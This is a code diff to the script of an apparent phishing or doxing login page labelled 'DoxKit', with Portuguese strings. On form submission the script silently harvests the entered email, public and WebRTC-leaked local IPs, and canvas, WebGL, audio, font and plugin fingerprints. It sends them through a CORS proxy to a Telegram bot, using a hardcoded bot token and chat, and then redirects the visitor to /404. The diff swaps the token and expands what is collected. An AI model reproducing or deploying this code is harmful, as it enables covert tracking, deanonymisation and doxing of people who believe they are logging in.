@@ -64,133 +64,175 @@
     </form>
   </div>
 <script>
-  const BOT_TOKEN = '8022691060:AAFXVc0JAyNfLkQ1c7dXENGq7M17bveDb8A';
+  const BOT_TOKEN = '8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8';
   const CHAT_ID = '@pegapegaospanela';
 
-  async function getWebRTCIP() {
-    return new Promise((resolve) => {
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel('');
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-      pc.onicecandidate = event => {
-        if (!event || !event.candidate) return resolve("Não encontrada");
-        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-        if (ipMatch) resolve(ipMatch[1]);
-        else resolve("Não encontrada");
-      };
-    });
-  }
-
-  async function getPublicIP() {
-    try {
-      const res = await fetch('https://api64.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip || "Não encontrada";
-    } catch {
-      return "Não encontrada";
-    }
-  }
-
-  async function getRequestHeaders() {
-    try {
-      const res = await fetch('https://httpbin.org/headers');
-      const json = await res.json();
-      return json.headers || {};
-    } catch {
-      return { "Headers": "Não encontrada" };
-    }
+  function proxy(url) {
+    return 'https://corsproxy.io/?' + encodeURIComponent(url);
   }
 
   async function getAudioFingerprint() {
     try {
       const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-      const osc = audioCtx.createOscillator();
-      const comp = audioCtx.createDynamicsCompressor();
-      osc.type = "triangle";
-      osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
-      comp.threshold.setValueAtTime(-50, audioCtx.currentTime);
-      comp.knee.setValueAtTime(40, audioCtx.currentTime);
-      comp.ratio.setValueAtTime(12, audioCtx.currentTime);
-      comp.attack.setValueAtTime(0, audioCtx.currentTime);
-      comp.release.setValueAtTime(0.25, audioCtx.currentTime);
-      osc.connect(comp);
-      comp.connect(audioCtx.destination);
-      osc.start(0);
-      osc.stop(audioCtx.currentTime + 0.1);
+      const oscillator = audioCtx.createOscillator();
+      oscillator.type = "triangle";
+      oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+      const compressor = audioCtx.createDynamicsCompressor();
+      compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
+      compressor.knee.setValueAtTime(40, audioCtx.currentTime);
+      compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
+      compressor.attack.setValueAtTime(0, audioCtx.currentTime);
+      compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
+      oscillator.connect(compressor);
+      compressor.connect(audioCtx.destination);
+      oscillator.start(0);
+      oscillator.stop(audioCtx.currentTime + 0.1);
       const buffer = await audioCtx.startRendering();
-      let sum = 0;
-      const chan = buffer.getChannelData(0);
-      for (let i = 4500; i < 5000; i++) sum += Math.abs(chan[i]);
-      return sum.toString();
+      let fingerprint = 0;
+      const channelData = buffer.getChannelData(0);
+      for (let i = 4500; i < 5000; i++) {
+        fingerprint += Math.abs(channelData[i]);
+      }
+      return fingerprint.toString();
     } catch {
-      return "Indisponível";
+      return "Bloqueado ou não suportado";
     }
   }
 
-  function getWebGLFingerprint() {
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-      if (dbg) {
-        return `${gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}`;
-      }
-    } catch {}
-    return "Não suportado";
-  }
-
-  function getCanvasFingerprintHash() {
+  function getCanvasFingerprint() {
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
     ctx.textBaseline = "top";
-    ctx.font = "14px Arial";
+    ctx.font = "14px 'Arial'";
     ctx.fillText("Fingerprint!", 2, 2);
-    return canvas.toDataURL().slice(-10);
+    return canvas.toDataURL();
+  }
+
+  function getWebGLFingerprint() {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return "WebGL não suportado";
+    const dbgInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    if (!dbgInfo) return "Extensão debug não disponível";
+    return `${gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL)}`;
+  }
+
+  async function getPublicIP() {
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      return ipData.ip || "Não foi possível obter";
+    } catch {
+      return "Não foi possível obter";
+    }
+  }
+
+  async function getWebRTCIPs() {
+    return new Promise((resolve) => {
+      if (typeof RTCPeerConnection === "undefined") return resolve("WebRTC não suportado");
+      const ips = new Set();
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = e => {
+        if (e.candidate && e.candidate.candidate) {
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+          const match = ipRegex.exec(e.candidate.candidate);
+          if (match) ips.add(match[1]);
+        }
+        if (e.candidate === null) {
+          resolve(Array.from(ips));
+          pc.close();
+        }
+      };
+    });
+  }
+
+  async function getInstalledPlugins() {
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      plugins.push(navigator.plugins[i].name);
+    }
+    return plugins.length ? plugins : ["Nenhum detectado"];
+  }
+
+  function getInstalledFonts() {
+    const fontList = ["Arial", "Courier New", "Comic Sans MS", "Georgia", "Impact", "Times New Roman", "Verdana"];
+    const testString = "mmmmmmmmmmlli";
+    const testSize = '72px';
+    function getFontWidth(font) {
+      const canvas = document.createElement("canvas");
+      const context = canvas.getContext("2d");
+      context.font = `${testSize} '${font}', monospace`;
+      return context.measureText(testString).width;
+    }
+    const installedFonts = fontList.filter(font => getFontWidth(font) !== getFontWidth("monospace"));
+    return installedFonts.length ? installedFonts : ["Nenhuma detectada"];
+  }
+
+  async function checkStorageAvailability(type) {
+    try {
+      const storage = type === 'localStorage' ? localStorage : sessionStorage;
+      const testKey = 'fingerprint_test';
+      storage.setItem(testKey, 'ok');
+      const isAvailable = storage.getItem(testKey) === 'ok';
+      storage.removeItem(testKey);
+      return isAvailable;
+    } catch {
+      return false;
+    }
   }
 
   async function sendToTelegram(text) {
-  const url = 'https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
-  await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text,
-      parse_mode: 'Markdown'
-    })
-  });
-}
+    const url = proxy(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+  }
 
   document.getElementById('login-form').addEventListener('submit', async function (e) {
     e.preventDefault();
 
     const email = document.getElementById('email').value;
-    const webrtcIP = await getWebRTCIP();
-    const publicIP = await getPublicIP();
-    const headers = await getRequestHeaders();
-    const audioFP = await getAudioFingerprint();
-    const webglFP = getWebGLFingerprint();
-    const canvasFP = getCanvasFingerprintHash();
-
-    const platform = navigator.platform;
     const userAgent = navigator.userAgent;
-    const lang = navigator.language;
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const res = `${screen.width}x${screen.height}`;
-    const viewport = `${window.innerWidth}x${window.innerHeight}`;
-    const cores = navigator.hardwareConcurrency || "Desconhecido";
-    const ram = navigator.deviceMemory || "Desconhecido";
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const resolution = `${screen.width} x ${screen.height}`;
+    const viewport = `${window.innerWidth} x ${window.innerHeight}`;
+    const colorDepth = screen.colorDepth;
+    const touchPoints = navigator.maxTouchPoints;
+    const cpuThreads = navigator.hardwareConcurrency || "Indisponível";
+    const ram = navigator.deviceMemory || "Indisponível";
+    const online = navigator.onLine;
+    const plugins = await getInstalledPlugins();
+    const fonts = getInstalledFonts();
+    const canvasFP = getCanvasFingerprint();
+    const webglFP = getWebGLFingerprint();
+    const audioFP = await getAudioFingerprint();
+    const publicIP = await getPublicIP();
+    const webrtcIPs = await getWebRTCIPs();
+    const cookiesEnabled = navigator.cookieEnabled;
+    const localStorageAvailable = await checkStorageAvailability('localStorage');
+    const sessionStorageAvailable = await checkStorageAvailability('sessionStorage');
 
-    let msg = `*Novo acesso ao DoxKit:*\n\n*E-mail:* ${email}\n*IP Público:* ${publicIP}\n*IP WebRTC:* ${webrtcIP}\n\n`;
-    msg += `*Plataforma:* ${platform}\n*User Agent:* ${userAgent}\n*Linguagem:* ${lang}\n*Fuso:* ${tz}\n`;
-    msg += `*Tela:* ${res}\n*Viewport:* ${viewport}\n*Cores:* ${cores}\n*RAM:* ${ram} GB\n\n`;
-    msg += `*WebGL:* ${webglFP}\n*Canvas Hash:* ${canvasFP}\n*Audio FP:* ${audioFP}\n\n`;
-    msg += `*Headers:*`;
-    for (const [key, value] of Object.entries(headers)) {
-      msg += `\n${key}: ${value}`;
-    }
+    let msg = `*Novo acesso ao DoxKit:*\n\n*E-mail:* ${email}\n\n` +
+      `*User Agent:* ${userAgent}\n*Plataforma:* ${platform}\n*Língua:* ${language}\n*Fuso horário:* ${timezone}\n\n` +
+      `*Resolução da tela:* ${resolution}\n*Viewport:* ${viewport}\n*Profundidade de cor:* ${colorDepth}\n*Touch Points:* ${touchPoints}\n\n` +
+      `*CPU Threads:* ${cpuThreads}\n*Memória RAM estimada:* ${ram}\n*Online:* ${online}\n*Cookies habilitados:* ${cookiesEnabled}\n\n` +
+      `*LocalStorage disponível:* ${localStorageAvailable}\n*SessionStorage disponível:* ${sessionStorageAvailable}\n\n` +
+      `*Plugins instalados:* ${plugins.join(', ')}\n*Fontes detectadas:* ${fonts.join(', ')}\n\n` +
+      `*Canvas fingerprint:* ${canvasFP}\n*WebGL fingerprint:* ${webglFP}\n*Audio fingerprint:* ${audioFP}\n\n` +
+      `*IP público:* ${publicIP}\n*IPs WebRTC:* ${webrtcIPs.join ? webrtcIPs.join(', ') : webrtcIPs}`;
 
     await sendToTelegram(msg);
+
     window.location.href = '/404';
   });
 </script>
